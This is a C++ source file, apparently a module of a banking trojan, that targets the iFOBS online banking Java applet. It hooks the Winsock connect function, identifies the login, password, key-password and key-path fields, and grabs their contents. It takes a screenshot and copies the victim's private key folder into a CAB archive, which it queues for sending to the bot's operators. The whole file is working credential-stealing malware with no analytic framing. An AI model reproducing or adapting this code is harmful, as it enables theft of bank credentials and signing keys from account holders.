//---------------------------------------------------------------------------

#pragma hdrstop

#include <windows.h>
#include <tlhelp32.h>

#include "IfobsOnline.h"
#include "BotClasses.h"
#include "WndUtils.h"
#include "Utils.h"
#include "GetApi.h"
#include "CabPacker.h"
#include "Loader.h"
#include "StrConsts.h"
#include "Splice.h"
#include "ScreenShots.h"
#include "WndUtils.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace IFOBSONLINEEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define IFODBG IFOBSONLINEEBUGSTRINGS::DBGOutMessage<>


HWND SearchJavaAppletWindow();


const static DWORD IFOLoginHashes[] = {0xBDD8F46C /* ����� */,
									   0xBDD8D9EC /* ���� */,
									   0xCDF9F4E8 /* login */,
									   0};

const static DWORD IFOPasswordHashes[] = {0xF1E44A82 /* ������ */,
										  0x3E1A7EFB /* password */,
										  0};


//==========================================================
//        ���������� ������ �������

namespace IfobsOnline
{
	DWORD PID = 0;        // ��� ��������, � ������� �������� ������
	TIfobsOnlineGrabber *Grabber = NULL;

	HWND  AppletWnd = 0;  // ������������� ���� ������

	// ���������� ���� ��� ��������� �����
	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);


	TConnect Real_Connect = NULL;



	// ������� ��������� ���������
	int WINAPI Hook_Connect(SOCKET s, const struct sockaddr *name, int namelen )
	{
		if (!IsWindowVisible(AppletWnd))
			AppletWnd = NULL;

		if (Grabber)
		{
			if (Grabber->SendLog())
			{
				delete Grabber;
				Grabber = NULL;
            }
		}
		return Real_Connect(s, name, namelen);
	}




	//*****************************************************
	//  Initialize - ������ �������������� ������
	//*****************************************************
	bool Initialize(HWND JafaFrameWnd, const char* URL)
	{
		// ��������� ������� �������
		if (IsNewProcess(PID))
		{
			Real_Connect = NULL;
			Grabber      = NULL;
		}


		// ��������� ������ ������
		if (Grabber)
		{
			delete Grabber;
			Grabber = NULL;
        }

		// ������ ����� ������
		Grabber = new TIfobsOnlineGrabber(JafaFrameWnd);

		if (!Grabber->IsIfobs())
		{
			// ���� �� �������� ����� �����
			delete Grabber;
			Grabber = NULL;
			return false;
        }

        IFODBG("IfobsOnline", "�������� IfobOnline [URL: %s]", URL);


		// ��������� �� ������� ��� ������������� �����
		if (!Real_Connect)
		{
			// ������������� ����
			if ( HookApi( DLL_WINSOCK, 0xEDD8FE8A /* connect */, &Hook_Connect ) )
			{
				__asm mov [Real_Connect], eax
			}
        }

		return true;
	}
    //---------------------------------------------------------------------------
}


//==========================================================


//******************************************************
//  ����� ������������� ����� ����� �� ����� ����
//******************************************************


int CALLBACK TIfobsOnlineGrabberEnumWnd(HWND Wnd, LPARAM Param)
{
	// ������������ ����
    ((TIfobsOnlineGrabber*)Param)->CheckWindow(Wnd);
	pEnumChildWindows(Wnd, TIfobsOnlineGrabberEnumWnd, Param);
	return TRUE;
}
//-----------------------------------------------------------------------------


TIfobsOnlineGrabber::TIfobsOnlineGrabber(HWND SunAwtFrameWnd)
{
	FSunAwtFrameWnd = SunAwtFrameWnd;
	FIsIfobs = false;
	Captions = 0;
	HWND CanvasWnd = GetSunAwtCanvasWnd(SunAwtFrameWnd);
	if (!CanvasWnd) return;

	pEnumChildWindows(CanvasWnd, TIfobsOnlineGrabberEnumWnd, (LPARAM)this);

    FIsIfobs = CheckScheme();
}
//-----------------------------------------------------------------------------

void TIfobsOnlineGrabber::InsertWnd(HWND Wnd, TBotList &L)
{
	if (L.IndexOf(Wnd) < 0) L.Add(Wnd);
}
//-----------------------------------------------------------------------------

//---------------------------------------------------
//  ��������� ���� � �����
//---------------------------------------------------
void TIfobsOnlineGrabber::CheckWindow(HWND Wnd)
{
	// ��������� �������� �����
	if (IsJavaEditWindow(Wnd))
		InsertWnd(Wnd, FEdits);
	else
	if (IsJavaLabelWindow(Wnd))
	{
		// ������������� � ��������� �������� ����
		if (SameWndTextWithHashArray(Wnd, &IFOLoginHashes[0], true))
			Captions |= 1;
		else
		if (SameWndTextWithHashArray(Wnd, &IFOPasswordHashes[0], true))
			Captions |= 2;
    }

}

//---------------------------------------------------
//  ������� ���������� ���� �� ��� ��������������
//---------------------------------------------------
HWND TIfobsOnlineGrabber::GetEditByID(LONG ID)
{
	for (int i = 0; i < FEdits.Count(); i++)
	{
		HWND Wnd = (HWND)FEdits.GetItem(i);
        LONG WNDID = (LONG)pGetWindowLongA(Wnd, GWL_ID);
		if (WNDID == ID) return Wnd;
	}
	return NULL;
}


//---------------------------------------------------
// ������� ��������� �����
//---------------------------------------------------
bool TIfobsOnlineGrabber::CheckScheme()
{

	// ������� ����� ������ ���� �� ������ 4 �����
	// ��� ������ � ������� ���������
	if (FEdits.Count() != 4)
		return false;

	// ��������� ��� ��������� �������
	if (Captions != 3) return false;


	LoginWnd       = GetEditByID(1);
	PasswordWnd    = GetEditByID(2);
	KeyPasswordWnd = GetEditByID(3);
	KeyPathWnd     = GetEditByID(4);
}

//---------------------------------------------------
// ������� ����������� ��������� ������
//---------------------------------------------------
string TIfobsOnlineGrabber::PackTextData()
{
	FLogin       = GetWndText2(LoginWnd);
	FPassword    = GetWndText2(PasswordWnd);
	FKeyPassword = GetWndText2(KeyPasswordWnd);
	FKeyFilePath = GetWndText2(KeyPathWnd);

	string Result;

	if (!FLogin.IsEmpty() && !FPassword.IsEmpty())
	{
		TBotStrings Fields;
		Fields.ValueDelimeter = ": ";
        Fields.AddValue("URL", GetURLFromJavaProcess());
		Fields.AddValue("Login", FLogin);
		Fields.AddValue("Password", FPassword);
		Fields.AddValue("KeyPassword", FKeyPassword);

		Result = Fields.GetText();
	}

	return Result;
}


//-----------------------------------------------------
//  AddFilewsToCab - ������ ��������� ����� ������ �
//                   �����
//-----------------------------------------------------
void TIfobsOnlineGrabber::AddFilesToCab(LPVOID Cab)
{
	if (!DirExists(FKeyFilePath.t_str())) return;

	IFODBG("IfobsOnline", "��������� ����� � �����: %s", FKeyFilePath.t_str());

	// ��������� ������������ ������ ����� � �������
	if (SizeFolderLess(FKeyFilePath.t_str(), IFOBS_MAX_KEY_PATH_SIZE, NULL))
		AddDirToCab(Cab, FKeyFilePath.t_str(), "Keys");
}
//----------------------------------------------------------------------------


//-----------------------------------------------------
//  SendLog - ������ �������� ���
//-----------------------------------------------------
BOOL TIfobsOnlineGrabber::SendLog()
{
	if (!FIsIfobs) return FALSE;

	string Log = PackTextData();
	if (Log.IsEmpty()) return FALSE;

    IFODBG("IfobsOnline", "������� ��� IFobsOnline: \r\n%s", Log.t_str());

	BOOL Result = FALSE;

	string CABName = "c:\\ifobs.cab";//File::GetTempName2A();
	HCAB Cab = CreateCab(CABName.t_str());
	if (Cab)
	{
		// ����������� ����� � ������
		AddStringToCab(Cab, Log, "Log.txt");

		// ��������� ��������
		string Screen = File::GetTempName2A();
		bool AddScreen = ScreenShot::Make(GetTopParentWindow(FSunAwtFrameWnd), 0, 0, 0, 0, NULL, Screen.t_str());
		if (AddScreen)
			AddFileToCab(Cab, Screen.t_str(), "Screen.png");
		pDeleteFileA(Screen.t_str());

		// ��������� �����
		AddFilesToCab(Cab);

		// ��������� ����
		CloseCab(Cab);

		// ���������� ���
		DataGrabber::SendCabDelayed(NULL, CABName.t_str(), GetStr(EStrSystemIfobsOnline).t_str());

		Result = TRUE;
	}

	pDeleteFileA(CABName.t_str());

	return Result;
}
//----------------------------------------------------------------------------



